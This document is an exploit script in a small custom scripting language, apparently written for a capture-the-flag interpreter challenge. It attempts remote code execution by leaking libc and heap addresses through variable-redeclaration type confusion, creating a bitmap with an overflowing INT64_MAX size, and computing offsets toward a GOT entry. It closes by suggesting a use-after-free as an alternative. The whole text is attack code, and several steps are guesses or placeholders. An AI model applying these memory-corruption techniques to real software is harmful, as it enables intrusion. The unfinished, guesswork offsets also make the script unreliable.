print("=== RCE Exploit with Heap-Based Bitmap Buffer ===");

print("Step 1: Leak libc");
string v2 = "BBBBBBBB";
int v2 = 4231312;
int leaked = length(v2);
print("Leaked libc:");
print(leaked);

print("Step 2: Leak heap address for reference");
int leak1 = 0;
string leak1 = "marker";
int heapaddr = leak1;
print("Heap marker:");
print(heapaddr);

print("Step 3: Calculate system");
print("system_addr calculated from leaked libc");

print("Step 4: Create bitmap");
bitmap b1 = create(9223372036854775807, 2);

print("Step 5: Try different bitmap buffer estimates");
print("Bitmap buffer is on heap, likely after variables");
print("Try: bitmap_data_ptr = heapaddr + offset");

print("Test 1: bitmap_data_ptr = heapaddr + 0x1000");
int bitmapptr1 = heapaddr + 4096;
int gotaddr = 4202568;
int offset1 = gotaddr - bitmapptr1;
print("offset1:");
print(offset1);
if (offset1 < 0) {
    print("Negative offset, bitmap buffer is after GOT");
    print("Try negative y coordinate or different approach");
}

print("Test 2: bitmap_data_ptr = heapaddr + 0x2000");
int bitmapptr2 = heapaddr + 8192;
int offset2 = gotaddr - bitmapptr2;
print("offset2:");
print(offset2);

print("Note: If offsets are negative, we need y > 0");
print("y = (offset * 8) / INT64_MAX");
print("For negative offset, this won't work with y=0");

print("Alternative: Use use-after-free to write directly");

